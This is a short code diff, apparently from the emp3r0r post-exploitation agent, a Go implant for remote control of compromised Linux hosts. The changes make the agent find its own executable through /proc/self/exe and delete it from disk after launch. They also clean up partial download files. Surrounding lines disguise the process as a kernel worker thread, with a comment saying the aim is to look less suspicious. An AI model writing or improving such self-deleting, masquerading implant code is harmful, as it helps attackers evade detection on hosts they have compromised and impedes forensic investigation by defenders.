@@ -13,6 +13,7 @@ import (
 	"os"
 	"os/exec"
 	"os/user"
+	"path/filepath"
 	"strings"
 	"time"
 
@@ -66,6 +67,10 @@ func main() {
 	}
 
 	// rename our agent process to make it less suspecious
+	self_path, err := os.Readlink("/proc/self/exe")
+	if err != nil {
+		self_path = os.Args[0]
+	}
 	osArgs := os.Args
 	agent.SetProcessName(fmt.Sprintf("[kworker/%d:%d-events]",
 		util.RandInt(1, 20),
@@ -80,7 +85,10 @@ func main() {
 				&buildinfo.Program{}, &lsp.Program{},
 				&shell.Program{})))
 	}
-	os.Remove(osArgs[0])
+	err = os.Remove(self_path)
+	if err != nil {
+		log.Printf("Error removing agent file from disk: %v", err)
+	}
 
 	// applyRuntimeConfig
 	err = agent.ApplyRuntimeConfig()
@@ -126,6 +134,19 @@ func main() {
 	}
 	if !util.IsExist(emp3r0r_data.DefaultShell) {
 		emp3r0r_data.DefaultShell = "/bin/sh"
+	}
+
+	// remove *.downloading files
+	err = filepath.Walk(agent.RuntimeConfig.AgentRoot, func(path string, info os.FileInfo, err error) error {
+		if err == nil {
+			if strings.HasSuffix(info.Name(), ".downloading") {
+				os.RemoveAll(path)
+			}
+		}
+		return nil
+	})
+	if err != nil {
+		log.Printf("Cleaning up *.downloading: %v", err)
 	}
 
 	// daemonize
